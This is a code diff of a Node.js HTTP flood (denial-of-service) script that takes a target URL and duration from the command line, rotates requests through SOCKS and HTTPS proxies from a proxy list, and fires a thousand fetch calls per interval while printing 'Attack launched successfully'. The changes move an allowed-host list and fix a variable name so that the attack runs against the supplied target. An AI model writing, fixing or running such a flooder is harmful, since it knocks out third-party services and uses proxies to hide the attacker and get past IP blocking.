@@ -4,6 +4,7 @@ const axios = require('axios');
 const target = process.argv[2];
 const duration = process.argv[3];
 const userIP = 'myserver2.junn4.my.id';
+const allowedIPs = ['myserver2.junn4.my.id'];
 const SocksProxyAgent = require('socks-proxy-agent');
 const HttpsProxyAgent = require('https-proxy-agent');
 const proxyListFile = 'proxy.txt';
@@ -51,7 +52,7 @@ else if (proxyUrl.startsWith('https'))
  agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) }); // Menggunakan HttpsProxyAgent dengan protocol 'http'
 }
 
-sendRequest(targetUrl, agent, userIP);
+sendRequest(target, agent, userIP);
 currentIndex++;
 setTimeout(sendRequestUsingNextProxy, 0);
 } 
@@ -80,7 +81,6 @@ console.log(" [!] Attack launched successfully");
 console.log("═════════════════════════════════════════════════════════════");
 
     const attackInterval = setInterval(() => {
-    const allowedIPs = ['myserver2.junn4.my.id'];
     sendRequests();
         for (let i = 0; i < 1000; i++) {
             fetch(target).catch(error => {});
